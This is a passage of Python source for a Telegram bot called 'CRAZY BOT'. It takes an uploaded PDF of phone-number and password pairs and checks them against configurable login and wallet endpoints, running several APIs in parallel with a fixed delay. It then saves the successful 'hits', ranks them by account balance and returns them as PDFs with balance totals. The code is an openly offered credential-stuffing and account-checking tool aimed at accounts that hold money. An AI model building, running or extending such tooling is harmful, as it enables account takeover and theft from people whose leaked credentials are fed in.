    if data.startswith("edit_"):
        api_key = data.replace("edit_", "")
        all_apis = get_all_apis()

        if api_key not in all_apis:
            await query.edit_message_text("❌ API not found! /start")
            return ConversationHandler.END

        api_info = all_apis[api_key]
        user_data_store[user_id] = {"edit_api_key": api_key}

        await query.edit_message_text(
            f"📝 *Update API: {api_info['name']}*\n\n"
            f"Current details:\n"
            f"`{api_info['name']}|{api_info['login_url']}|{api_info['wallet_url']}|{api_info['origin']}|{api_info['referer']}`\n\n"
            "Send new details in same format:\n"
            "`API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Or send same to keep unchanged.",
            parse_mode="Markdown"
        )
        return WAITING_FOR_EDIT_API_DATA

    return WAITING_FOR_EDIT_API_SELECT

async def process_edit_api(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    parts = text.split("|")

    if len(parts) < 5:
        await update.message.reply_text(
            "❌ Invalid format! Need: `API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Try again:",
            parse_mode="Markdown"
        )
        return WAITING_FOR_EDIT_API_DATA

    api_name = parts[0].strip()
    login_url = parts[1].strip()
    wallet_url = parts[2].strip()
    origin = parts[3].strip()
    referer = parts[4].strip()

    if not login_url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Invalid login URL! Try again:")
        return WAITING_FOR_EDIT_API_DATA

    edit_data = user_data_store.get(user_id, {})
    old_api_key = edit_data.get("edit_api_key")

    if not old_api_key:
        await update.message.reply_text("❌ Error! /start")
        return ConversationHandler.END

    all_apis = get_all_apis()
    if old_api_key not in all_apis:
        await update.message.reply_text("❌ API not found! /start")
        return ConversationHandler.END

    new_api_key = api_name.lower().replace(" ", "_")

    # Update in custom APIs (can't modify defaults, so save as custom override)
    custom_apis = load_custom_apis()

    # Remove old key if it was custom
    if old_api_key in custom_apis:
        del custom_apis[old_api_key]

    custom_apis[new_api_key] = {
        "name": api_name,
        "login_url": login_url,
        "wallet_url": wallet_url,
        "origin": origin,
        "referer": referer,
    }
    save_custom_apis(custom_apis)

    await update.message.reply_text(
        f"✅ *API Updated!*\n\n"
        f"📡 Name: *{api_name}*\n"
        f"🔗 Login: `{login_url}`\n\n"
        "▶️ /start to use",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

# ==================== TELEGRAM HANDLERS ====================
async def start(update, context):
    user = update.effective_user
    user_id = user.id
    existing_task = user_tasks.get(user_id)
    if existing_task and not existing_task.done():
        existing_task.cancel()
    await reset_user_session(user_id)
    save_chat_history(user_id, user.username, user.first_name, user.last_name, "command", "/start")

    keyboard = [
        [InlineKeyboardButton("🚀 ALL APIs (Parallel)", callback_data="api_all")],
        [InlineKeyboardButton("➕ Add API", callback_data="add_api")],
        [InlineKeyboardButton("⚙️ Edit APIs", callback_data="edit_apis")],
    ]

    all_apis = get_all_apis()

    await update.message.reply_text(
        "🤖 *CRAZY BOT*\n"
        f"📡 *{len(all_apis)} APIs* | ⏱️ *{FIXED_DELAY}s delay*\n\n"
        "📄 *Upload PDF* with `phone password`\n"
        "👇 *Choose:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return WAITING_FOR_API_SELECTION

async def handle_api_selection(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    selected = query.data

    if selected == "api_all":
        all_apis = get_all_apis()
        user_data_store[user_id] = {
            "mode": "all",
            "apis": all_apis,
        }
        await query.edit_message_text(
            f"✅ *{len(all_apis)} APIs* | ⏱️ *{FIXED_DELAY}s* delay\n\n"
            "📄 *Send PDF* (`phone password`)\n"
            "📤 *Upload now:*",
            parse_mode="Markdown"
        )
        return WAITING_FOR_PDF

    elif selected == "add_api":
        return await add_api_handler(update, context)

    elif selected == "edit_apis":
        return await edit_apis_handler(update, context)

    return WAITING_FOR_API_SELECTION

async def handle_pdf(update, context):
    user_id = update.effective_user.id
    user_data = user_data_store.get(user_id, {})

    if not user_data.get("apis"):
        await update.message.reply_text("⚠️ First select mode! /start")
        return ConversationHandler.END

    file = await update.message.document.get_file()
    pdf_bytes = await file.download_as_bytearray()
    file_name = update.message.document.file_name

    print(f"\n📄 PDF received from user {user_id}: {file_name}")

    credentials = extract_credentials_from_pdf(pdf_bytes)
    if not credentials:
        await update.message.reply_text(
            "😔 *No credentials found in PDF!*\n\n"
            "Make sure PDF contains:\n"
            "Phone number (10 digits)\n"
            "Password\n\n"
            "Format: `9876543210 password123`\n\n"
            "▶️ /start to try again",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    user_data["credentials"] = credentials
    user_data_store[user_id] = user_data

    await update.message.reply_text(
        f"📄 *PDF OK* — {len(credentials)} accounts | {len(user_data['apis'])} APIs\n"
        "🚀 *Starting...*",
        parse_mode="Markdown"
    )

    # Auto-start with fixed delay
    apis = user_data.get("apis", {})

    await update.message.reply_text(
        f"🚀 *Running* | 📡 {len(apis)} APIs | 🔢 {len(credentials)} accounts\n"
        "🛑 /stop",
        parse_mode="Markdown"
    )

    task = asyncio.create_task(
        run_all_apis_checking(update, context, user_id, credentials, apis)
    )
    user_tasks[user_id] = task
    return ConversationHandler.END

async def stop_command(update, context):
    user_id = update.effective_user.id
    task = user_tasks.get(user_id)
    if task and not task.done():
        task.cancel()
        await update.message.reply_text(
            "🛑 *Stopping...*\n"
            "⏳ Partial PDFs will be sent for APIs that have hits.\n"
            "⏰ This may take a few minutes...",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚠️ *No active process*", parse_mode="Markdown")

async def help_command(update, context):
    await update.message.reply_text(
        "🤖 *CRAZY BOT — Help*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "*Commands:*\n"
        "/start - Start new session\n"
        "/stop - Stop current process\n"
        "/partial - Send partial results (if bot crashed)\n"
        "/help - Show this help\n\n"
        "*Features:*\n"
        "• Check ALL APIs simultaneously\n"
        "• Separate PDF per API\n"
        "• Add/Edit/Remove APIs\n"
        "• Fixed 3s delay between numbers\n"
        "• Auto-save hits to database\n"
        "• Crash recovery with /partial\n\n"
        "*How to use:*\n"
        "1️⃣ Click 🚀 ALL APIs\n"
        "2️⃣ Upload PDF with phone & password\n"
        "3️⃣ Bot auto-starts with 3s delay\n"
        "4️⃣ Get separate PDF per API + summary\n\n"
        "*PDF Format:*\n"
        "Each line: `phone password`\n"
        "Example: `9876543210 mypassword123`",
        parse_mode="Markdown"
    )

async def partial_command(update, context):
    """Send partial results from DB if bot crashed or PDF didn't arrive"""
    user_id = update.effective_user.id
    all_apis = get_all_apis()
    sent_any = False

    await update.message.reply_text("🔍 *Checking for saved hits...*", parse_mode="Markdown")

    for api_key, api_info in all_apis.items():
        hits = get_hits_for_api(user_id, api_key)
        if hits:
            # Sort by balance descending
            try:
                hits.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
            except:
                pass
            try:
                pdf_bytes, filename = generate_api_pdf(hits, api_info["name"])
                total_balance = sum(float(h.get("balance", 0)) for h in hits)
                await update.message.reply_document(
                    document=io.BytesIO(pdf_bytes),
                    filename=filename,
                    caption="📁 *" + api_info["name"] + "* — " + str(len(hits)) + " accounts (Recovered)\n💰 Total Balance: *" + "{:.2f}".format(total_balance) + "*"
                )
                sent_any = True
            except Exception as e:
                print(f"Partial PDF error for {api_info['name']}: {e}")

    if not sent_any:
        await update.message.reply_text("😔 *No saved hits found.* Try /start again.", parse_mode="Markdown")
    else:
        await update.message.reply_text("✅ *All recovered PDFs sent!*", parse_mode="Markdown")

# ==================== ERROR HANDLER ====================
async def error_handler(update, context):
    print(f"Update {update} caused error {context.error}")
    traceback.print_exc()

# ==================== MAIN FUNCTION ====================
def main():
    print("="*60)
    print("  🤪 CRAZY BOT STARTING...")
    print("="*60)

    init_database()

    # Load custom APIs on start
    custom_count = len(load_custom_apis())
    print(f"  Custom APIs loaded: {custom_count}")
    print(f"  Total APIs: {len(get_all_apis())}")
    print(f"  Fixed delay: {FIXED_DELAY}s")
    print("="*60)

    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_API_SELECTION: [CallbackQueryHandler(handle_api_selection)],
            WAITING_FOR_PDF: [MessageHandler(filters.Document.PDF, handle_pdf)],
            WAITING_FOR_ADD_API: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_add_api)],
            WAITING_FOR_EDIT_API_SELECT: [CallbackQueryHandler(handle_edit_api_callback)],
            WAITING_FOR_EDIT_API_DATA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_edit_api)],
        },
        fallbacks=[
            CommandHandler("start", start),
            CommandHandler("stop", stop_command),
        ],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("partial", partial_command))
    application.add_error_handler(error_handler)

    print("✅ Bot is running! Press Ctrl+C to stop.")
    print("="*60)

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
